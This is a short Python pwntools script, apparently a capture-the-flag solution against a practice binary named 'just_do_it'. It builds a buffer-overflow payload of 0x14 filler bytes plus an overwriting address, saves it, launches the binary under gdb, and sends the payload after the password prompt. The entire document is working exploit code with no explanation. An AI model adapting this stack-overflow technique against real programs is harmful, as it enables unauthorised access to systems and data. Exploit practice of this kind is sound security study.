from pwn import *

payload = b"A"*0x14
payload+=p32(0x0804a080)

with open("payload", "wb") as fp:
    fp.write(payload)

t = pwnlib.gdb.debug('./just_do_it')

buf = t.readuntil("password.")
t.sendline(payload)



t.interactive()
